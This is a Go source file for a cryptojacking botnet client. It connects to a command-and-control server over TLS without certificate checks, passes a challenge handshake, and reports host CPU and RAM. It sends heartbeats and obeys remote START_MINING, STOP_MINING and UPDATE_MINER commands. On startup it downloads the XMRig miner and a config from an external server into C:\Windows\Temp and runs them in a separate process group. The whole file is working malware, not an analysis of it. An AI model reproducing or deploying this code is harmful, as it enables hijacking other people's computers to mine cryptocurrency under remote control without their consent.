package main

import (
	"bufio"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/shirou/gopsutil/mem"
)

const (
	C2Address         = "127.0.0.1:7003"
	reconnectDelay    = 5 * time.Second
	heartbeatInterval = 30 * time.Second
	maxRetries        = 5
	baseRetryDelay    = 1 * time.Second
	xmrigURL          = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
	configURL         = "http://yourconfigserver.com/config.json"
	minerPath         = "C:\\Windows\\Temp\\xmrig.exe"
	configPath        = "C:\\Windows\\Temp\\config.json"
)

var (
	stopChan   = make(chan struct{})
	minerCmd   *exec.Cmd
	minerMutex sync.Mutex
	isMining   atomic.Bool
)

type MinerStats struct {
	Hashrate    float64
	Accepted    int64
	Rejected    int64
	TotalHashes int64
	Uptime      time.Duration
	LastUpdate  time.Time
}

func main() {
	rand.Seed(time.Now().UnixNano())
	attempt := 0

	if !fileExists(minerPath) || !fileExists(configPath) {
		if err := downloadMiner(); err != nil {
			log.Printf("Failed to download miner: %v", err)
			return
		}
	}

	for {
		conn, err := connectToC2()
		if err != nil {
			attempt++
			delay := time.Duration(attempt*attempt) * baseRetryDelay
			if delay > 30*time.Second {
				delay = 30 * time.Second
			}
			log.Printf("Connection failed (attempt %d): %v, retrying in %v", attempt, err, delay)
			time.Sleep(delay)
			continue
		}
		attempt = 0

		if err := handleChallenge(conn); err != nil {
			log.Printf("Challenge failed: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		if err := runBot(conn); err != nil {
			log.Printf("Bot error: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
		}
	}
}

func downloadMiner() error {
	if err := downloadFile(xmrigURL, minerPath); err != nil {
		return fmt.Errorf("failed to download miner: %w", err)
	}
	if err := downloadFile(configURL, configPath); err != nil {
		return fmt.Errorf("failed to download config: %w", err)
	}
	return nil
}

func downloadFile(url, path string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

func connectToC2() (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}

	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	conn, err := tls.DialWithDialer(dialer, "tcp", C2Address, tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %w", err)
	}

	tcpConn, ok := conn.NetConn().(*net.TCPConn)
	if !ok {
		conn.Close()
		return nil, fmt.Errorf("could not get TCP connection")
	}

	tcpConn.SetKeepAlive(true)
	tcpConn.SetKeepAlivePeriod(30 * time.Second)

	return conn, nil
}

func runBot(conn net.Conn) error {
	defer conn.Close()

	cores := runtime.NumCPU()
	ramGB := getRAMGB()
	_, err := conn.Write([]byte(fmt.Sprintf("PONG:%s:%d:%.1f\n", runtime.GOARCH, cores, ramGB)))
	if err != nil {
		return fmt.Errorf("initial info send failed: %w", err)
	}

	cmdChan := make(chan string)
	defer close(cmdChan)

	go func() {
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			cmdChan <- scanner.Text()
		}
	}()

	heartbeatDone := make(chan struct{})
	go func() {
		sendHeartbeat(conn, cores, ramGB)
		close(heartbeatDone)
	}()

	for {
		select {
		case command := <-cmdChan:
			if err := handleCommand(command); err != nil {
				log.Printf("Command error: %v", err)
			}
		case <-heartbeatDone:
			return nil
		case <-time.After(30 * time.Second):
			return nil
		}
	}
}

func handleChallenge(conn net.Conn) error {
	reader := bufio.NewReader(conn)
	challengeLine, err := reader.ReadString('\n')
	if err != nil {
		return fmt.Errorf("read challenge failed: %w", err)
	}

	challenge := strings.TrimPrefix(strings.TrimSpace(challengeLine), "CHALLENGE:")
	response := computeResponse(challenge)

	_, err = conn.Write([]byte(response + "\n"))
	return err
}

func computeResponse(challenge string) string {
	parts := strings.Split(challenge, ":")
	if len(parts) < 2 {
		hash := sha256.Sum256([]byte(challenge + "SALT"))
		return hex.EncodeToString(hash[:])
	}
	hash := sha256.Sum256([]byte(parts[0] + parts[1]))
	return hex.EncodeToString(hash[:])
}

func sendHeartbeat(conn net.Conn, cores int, ramGB float64) {
	ticker := time.NewTicker(heartbeatInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			miningStatus := 0
			if isMining.Load() {
				miningStatus = 1
			}

			conn.Write([]byte(fmt.Sprintf("HEARTBEAT:%s:%d:%.1f:%d\n",
				runtime.GOARCH, cores, ramGB, miningStatus)))
		case <-stopChan:
			return
		}
	}
}

func getRAMGB() float64 {
	mem, err := mem.VirtualMemory()
	if err != nil {
		return 0
	}
	return float64(mem.Total) / (1024 * 1024 * 1024)
}

func handleCommand(command string) error {
	switch command {
	case "START_MINING":
		startMining()
		return nil
	case "STOP_MINING":
		stopMining()
		return nil
	case "UPDATE_MINER":
		return updateMiner()
	default:
		return fmt.Errorf("unknown command")
	}
}

func startMining() {
	if isMining.Load() {
		return
	}

	minerMutex.Lock()
	defer minerMutex.Unlock()

	ctx := context.Background()
	minerCmd = exec.CommandContext(ctx, minerPath, "--config="+configPath)

	if runtime.GOOS == "windows" {
		minerCmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
		}
	}

	go func() {
		isMining.Store(true)
		defer isMining.Store(false)

		if err := minerCmd.Start(); err != nil {
			log.Printf("Failed to start miner: %v", err)
			return
		}

		if err := minerCmd.Wait(); err != nil {
			log.Printf("Miner exited: %v", err)
		}
	}()
}

func stopMining() {
	if !isMining.Load() {
		return
	}

	minerMutex.Lock()
	defer minerMutex.Unlock()

	if minerCmd != nil && minerCmd.Process != nil {
		if runtime.GOOS == "windows" {
			exec.Command("taskkill", "/F", "/T", "/PID", fmt.Sprintf("%d", minerCmd.Process.Pid)).Run()
		} else {
			minerCmd.Process.Kill()
		}
	}
	isMining.Store(false)
}

func updateMiner() error {
	stopMining()
	return downloadMiner()
}
